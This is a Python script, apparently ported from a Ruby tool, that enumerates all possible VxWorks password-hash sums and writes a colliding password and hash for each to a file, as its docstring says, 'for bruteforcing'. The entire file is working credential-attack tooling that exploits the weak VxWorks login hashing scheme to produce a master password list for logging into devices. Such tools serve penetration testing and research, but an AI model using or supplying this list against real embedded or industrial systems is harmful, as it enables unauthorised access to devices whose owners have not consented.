#!/usr/bin/env python3
"""
Generate the VxWorks master password list (Python port).

This reproduces the behavior of the original Ruby script by enumerating all
possible VxWorks password sums and writing the corresponding hashes/passwords
to a file for bruteforcing.
"""

from __future__ import annotations

import sys
from typing import List, Optional, Sequence, Tuple

from vxencrypt import hackit


def vxworks_sum_from_pass(password: str) -> int:
    if len(password) < 8 or len(password) > 40:
        raise ValueError("too short or too long")
    total = 0
    for idx, ch in enumerate(password):
        byte = ord(ch)
        total += (byte * (idx + 1)) ^ (idx + 1)
    return total


def vxworks_hash_from_sum(sum_value: int) -> str:
    return hackit(sum_value)


def vxworks_pass_from_sum_refine(sum_value: int, current_sum: int, password: str) -> str:
    for i in range(len(password)):
        tpass = list(password)
        while ord(tpass[i]) > 0x21:
            tpass[i] = chr(ord(tpass[i]) - 1)
            current_sum = vxworks_sum_from_pass("".join(tpass))
            if current_sum == sum_value:
                return "".join(tpass)
    for i in range(len(password)):
        tpass = list(password)
        while ord(tpass[i]) < 0x7C:
            tpass[i] = chr(ord(tpass[i]) + 1)
            current_sum = vxworks_sum_from_pass("".join(tpass))
            if current_sum == sum_value:
                return "".join(tpass)
    return "<failed>"


def vxworks_pass_from_sum(sum_value: int, last_pass: Optional[str] = None) -> str:
    opass = last_pass or "\x20" * 8
    password = list(opass)
    fmax = 0xFF if sum_value > 10000 else 0x7B
    pidx = 0
    pcnt = ord(password[0])

    bsum = vxworks_sum_from_pass("".join(password))
    if bsum > sum_value:
        return "<invalid>"

    while bsum != sum_value:
        if bsum > sum_value:
            return vxworks_pass_from_sum_refine(sum_value, bsum, "".join(password))
        if pcnt > fmax:
            pidx += 1
            if pidx == len(password):
                password.append(" ")
            pcnt = ord(password[pidx])
        password[pidx] = chr(pcnt)
        bsum = vxworks_sum_from_pass("".join(password))
        pcnt += 1
    return "".join(password)


def build_seedsets() -> List[List[Tuple[int, str]]]:
    seedsets: List[List[Tuple[int, str]]] = []

    seeds: List[Tuple[int, str]] = []
    for slen in range(8, 9):
        for cset in range(0x23, 0x7D):
            sbase = chr(cset) * slen
            seeds.append((vxworks_sum_from_pass(sbase), sbase))
    seedsets.append(seeds)

    seeds = []
    for slen in range(8, 13):
        for cset in range(0x23, 0x7D):
            sbase = chr(cset) * slen
            seeds.append((vxworks_sum_from_pass(sbase), sbase))
    seedsets.append(seeds)

    seeds = []
    for slen in range(8, 17):
        for cset in range(0x23, 0xF1):
            sbase = chr(cset) * slen
            seeds.append((vxworks_sum_from_pass(sbase), sbase))
    seedsets.append(seeds)

    seeds = []
    for slen in range(8, 17):
        for cset in range(0x23, 0x100):
            sbase = chr(cset) * slen
            seeds.append((vxworks_sum_from_pass(sbase), sbase))
    seedsets.append(seeds)

    seeds = []
    for slen in range(8, 41):
        for cset in range(0x23, 0x100):
            sbase = chr(cset) * slen
            seeds.append((vxworks_sum_from_pass(sbase), sbase))
    seedsets.append(seeds)

    return seedsets


def find_seed(seeds: Sequence[Tuple[int, str]], target: int) -> Optional[str]:
    for sum_value, seed in reversed(seeds):
        if target > (sum_value + 1000):
            return seed
    return None


def main() -> None:
    outputfile = sys.argv[1] if len(sys.argv) > 1 else "masterpasswords.txt"

    try:
        handle = open(outputfile, "wb")
    except OSError as exc:
        sys.stderr.write(f"[-] Unable to open {outputfile}: {exc}\n")
        sys.exit(1)

    seedsets = build_seedsets()

    for i in range(1, 209657):
        found = False
        for seeds in seedsets:
            lhash = find_seed(seeds, i)
            vx_hash = vxworks_hash_from_sum(i)
            password = vxworks_pass_from_sum(i, lhash)

            if i % 1000 == 0:
                print(f"[*] Generated {i} of 209656 passwords...")

            if i > 1187 and password.startswith("<"):
                continue

            handle.write(f"{i}|{vx_hash}|{password}\x00\n".encode())
            found = True
            break
        if not found:
            print(f"FAILED TO GENERATE {i}")
            handle.close()
            sys.exit(1)

    handle.close()


if __name__ == "__main__":
    main()
